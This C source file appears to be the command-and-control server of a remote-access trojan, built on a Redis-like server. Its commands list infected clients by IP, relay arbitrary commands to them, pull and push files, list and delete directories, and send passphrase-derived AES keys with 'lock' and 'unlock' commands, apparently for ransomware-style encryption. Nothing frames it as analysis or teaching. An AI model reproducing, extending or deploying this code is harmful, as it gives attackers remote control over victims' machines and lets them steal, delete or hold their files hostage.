#include "server.h"
#include "mycommand.h"
#include "myutils.h"
#include <string.h>
#include <arpa/inet.h>
#include <setjmp.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>


#define generateCommandTimes(type, value) \
void type##Command(client *c) {\
	client *cl = genericGetClient(c);\
	if(cl == NULL){\
		addReply(c, shared.err);\
		return;\
	}\
\
	addReply(cl, shared.mbulkhdr[value]);\
	addReplyBulkCString(cl, ""#type);\
	for(int i = 1; i < value; i++) \
		addReplyBulkCString(cl, c->argv[i + 1]->ptr);\
\
	addReply(c, shared.ok);\
\
}

extern jmp_buf jmp_env;

client* genericGetClient(client* c){
	listNode *ln;
	listIter li;

	if(c->enable_client != true || c->is_control != true || c->argv[1]->type != OBJ_STRING){
		addReply(c, shared.err);
		return NULL;
	}

	client* cl = NULL;
	listRewind(server.clients, &li);
	while((ln = listNext(&li))){
		cl = listNodeValue(ln);
		if(!cl->hashid){
			cl = NULL;
			continue;
		}
		if(!strcasecmp(c->argv[1]->ptr, cl->hashid)){
			break;
		}
		cl = NULL;
	}
	return cl;
}

void enableCommand(client *c){
	if(c->argc == 3 && !strncmp(c->argv[1]->ptr, "1", 1)){
		c->hashid = sdsnew(c->argv[2]->ptr);
		c->enable_client = true;
		c->is_control = false;
		addReply(c, shared.ok);
	}
	else if(c->argc == 3 && !strncmp(c->argv[1]->ptr, "2", 1) && (!server.secretphrase || !strncmp(c->argv[2]->ptr, server.secretphrase, sdslen(server.secretphrase)))){
		c->enable_client = true;
		c->is_control = true;
		addReply(c, shared.ok);
	}
	else
		addReply(c, shared.err);
	return;
}

void getClientsCommand(client *c){
	listNode* ln;
	listIter li;
	char buf[1024];
	sds replySds = sdsempty();
	listRewind(server.clients, &li);
	bool hasClient = false;
	while((ln = listNext(&li))){
		client* cl = listNodeValue(ln);
		if(!cl->enable_client || cl->is_control || cl == c){
			continue;
		}
		hasClient = true;
		memset(buf, 0, sizeof(buf));
		sprintf(buf, "[%d] client->ip ", cl->fd);

		struct sockaddr_in sa;
		socklen_t len = sizeof(sa);
		if(!getpeername(cl->fd, (struct sockaddr*)&sa, &len)){
			strcat(buf + strlen(buf), inet_ntoa(sa.sin_addr));
			strcat(buf + strlen(buf), ": ");
			sprintf(buf + strlen(buf), "%d\t", sa.sin_port);
			replySds = sdscat(replySds, sdsnew(buf));
			/*sdscat(replySds, sdsnew(inet_ntoa(sa.sin_addr)));
			sdscat(replySds, sdsnew(": "));
			sdscat(replySds, sdsfromlonglong((long long)ntohs(sa.sin_port)));
			*/
		}
	}
	if(!hasClient){
		addReply(c, shared.err);
		return;
	}
	addReplySds(c, sdsnew("+"));
	addReplySds(c, replySds);
	addReplySds(c, sdsnew("\r\n"));
}

void sendCmdCommand(client *c){	
	client *cl = genericGetClient(c);

	if(cl == NULL){
		addReply(c, shared.err);
		return;
	}
	addReply(cl, shared.mbulkhdr[c->argc - 2]);
	for(int i = 2; i < c->argc; i++){
		addReplyBulkCString(cl, c->argv[i]->ptr);
	}

	addReply(c, shared.ok);
}

void printchar(unsigned char c){
		switch(c){
		case 0:
		case 1:
		case 2:
		case 3:
		case 4:
		case 5:
		case 6:
		case 7:
		case 8:
		case 9:
			printf("%c", c + '0');break;
		case 10:
			printf("a");break;
		case 11:
			printf("b");break;
		case 12:
			printf("c");break;
		case 13:
			printf("d");break;
		case 14:
			printf("e");break;
		case 15:
			printf("f");break;
		}
		
}

void printhex(unsigned char buf[], int size){
	for(int i = 0; i < size; i++){
		printchar(buf[i] >> 4);
		printchar(buf[i] & 0x0f);

	}
	printf("\n");
}

void lockCommand(client *c){
	unsigned char hash[20];
	client *cl = genericGetClient(c);
	if(cl == NULL){
		addReply(c, shared.err);
		return;
	}
	gethashforaes(sdsnew(c->argv[1]->ptr), hash);
	memset(hash + 16, 0 , 4);

	addReply(cl, shared.mbulkhdr[3]);
	if(!strcasecmp(c->argv[0]->ptr, "lock"))
		addReplyBulkCString(cl, "lock");
	else
		addReplyBulkCString(cl, "unlock");
	addReplyBulkSds(cl, sdsnewlen(hash, 16));
	addReplyBulkCString(cl, c->argv[2]->ptr);

	addReply(c, shared.ok);
	return;
}

/* file transport*/
void downloadCommand(client *c){
	volatile int tfd, cfd = c->fd;
	/* debug */
	int count, ret;
	packet pac;
	client *cl = genericGetClient(c);

	if(cl == NULL){
		addReply(c, shared.err);
		return;
	}

	aeDeleteFileEvent(server.el, cl->fd, AE_READABLE | AE_WRITABLE);
	aeDeleteFileEvent(server.el, c->fd, AE_READABLE | AE_WRITABLE);
	/* unregister epoll events*/

	/* send cmd to the trojan client */
	tfd = cl->fd;
	memset(&pac, 0, sizeof(pac));
	sprintf(pac.data, "*2\r\n$8\r\ndownload\r\n$%d\r\n%s\r\n", (int)strlen(c->argv[2]->ptr),(char*)c->argv[2]->ptr);
	ret = write(tfd, pac.data, strlen(pac.data));
	int flags = fcntl(tfd, F_GETFL, 0);

	fcntl(tfd, F_SETFL, 0);
	if(ret < 0)
		goto err;
	if(setjmp(jmp_env))
		goto err;
	cfd = open("testdownload.txt", O_RDWR|O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO);
	if(fork()==0){
		while(1){
			memset(&pac, 0, sizeof(pac));
			alarm(5);
			count = read(tfd, &pac, sizeof(pac));

			if(count > 0){
				switch(pac.type){
				case 1:
					ret = write(cfd, pac.data, sizeof(pac.data));
					if(ret < 0)
						goto err;
					break;
				case 2:
					ret = write(cfd, pac.data, sizeof(pac.data));
					close(cfd);
					aeCreateFileEvent(server.el, cl->fd, AE_READABLE, readQueryFromClient, cl);
					aeCreateFileEvent(server.el, cl->fd, AE_WRITABLE, sendReplyToClient, cl);
					aeCreateFileEvent(server.el, c->fd, AE_READABLE, readQueryFromClient, c);
					aeCreateFileEvent(server.el, c->fd, AE_WRITABLE, sendReplyToClient, c);
					fcntl(tfd, F_SETFL, flags);
					exit(0);
				default:
					goto err;
				}
			}
			else{
err:			/* error handle*/
				aeCreateFileEvent(server.el, cl->fd, AE_READABLE, readQueryFromClient, cl);
				aeCreateFileEvent(server.el, cl->fd, AE_WRITABLE, sendReplyToClient, cl);
				aeCreateFileEvent(server.el, c->fd, AE_READABLE, readQueryFromClient, c);
				aeCreateFileEvent(server.el, c->fd, AE_WRITABLE, sendReplyToClient, c);
				pac.type = 0;
				ret = write(cfd, &pac.data, sizeof(pac.data));
				fcntl(tfd, F_SETFL, flags);
				close(cfd);
				exit(0);
			}
		}
	}

	addReply(c, shared.ok);
	return ;
}

void uploadCommand(client *c){
	struct stat stbuf;
	packet pac;
	int tfd, cfd, leftcount, count, ret;
	client *cl = genericGetClient(c);

	if(cl == NULL){
		addReply(c, shared.err);
		return;
	}

	//aeDeleteFileEvent(server.el, cl->fd, AE_READABLE | AE_WRITABLE);
	//aeDeleteFileEvent(server.el, c->fd, AE_READABLE | AE_WRITABLE);
	/* unregister epoll events*/

	/* send cmd to the trojan client */
	tfd = cl->fd;
	memset(&pac, 0, sizeof(pac));
	sprintf(pac.data, "*2\r\n$8\r\nupload\r\n$%d\r\n%s\r\n", (int)strlen(c->argv[2]->ptr),(char*)c->argv[2]->ptr);
	ret = write(tfd, pac.data, strlen(pac.data));
	int flags = fcntl(tfd, F_GETFL, 0);

	if(setjmp(jmp_env))
		goto err;
	if(fork() == 0){
		fcntl(tfd, F_SETFL, 0);
		cfd = open("testdownload.txt", O_RDWR);
		if(fstat(cfd, &stbuf) != 0)
			exit(0);
		leftcount = stbuf.st_size;
		while(1){
			memset(&pac, 0, sizeof(pac));
			alarm(5);
			count = read(cfd, &pac.data, sizeof(pac.data));
			leftcount -= count;
			if(count > 0){
				if(leftcount > 0)
					pac.type = 2;
				else
					pac.type = 1;
				ret = write(tfd, &pac, sizeof(pac));
				if(ret < 0)
					goto err;
			}
			else{
err:			/* error handle*/
				pac.type = 0;
				ret = write(tfd, &pac.data, sizeof(pac.data));
				fcntl(tfd, F_SETFL, flags);
				close(cfd);
				exit(0);
			}
		}
	}

	addReply(c, shared.ok);
	return;
}

void lsCommand(client *c){
	int tfd, ret;
	char buff[1024 * 16];
	client *cl = genericGetClient(c);

	if(cl == NULL){
		addReply(c, shared.err);
		return;
	}

	tfd = cl->fd;
	sprintf(buff, "*1\r\n$2\r\nls\r\n");
	ret = write(tfd, buff, strlen(buff));
	int flags = fcntl(tfd, F_GETFL, 0);

	if(setjmp(jmp_env))
		goto err;

	if(fork() == 0){
		fcntl(tfd, F_SETFL, 0);
		memset(buff, 0, sizeof(buff));
		alarm(5);
		int count = read(tfd, buff, sizeof(buff));
		if(count > 0){
			ret = write(c->fd, buff, strlen(buff));
			if(ret < 0)
				goto err;
		}
err:			/* error handle*/
		addReply(c, shared.err);
		fcntl(tfd, F_SETFL, flags);
		exit(0);
	}

	return;

}

/*    generateComamnd using macro      */
generateCommandTimes(copy, 2)
generateCommandTimes(cut, 2)
generateCommandTimes(paste, 1)
generateCommandTimes(delete, 2)


/* directory control */
generateCommandTimes(rmdir, 2)
generateCommandTimes(cd, 2)
generateCommandTimes(mv, 3)
generateCommandTimes(newdir, 2)

generateCommandTimes(up, 1)
generateCommandTimes(back, 1)
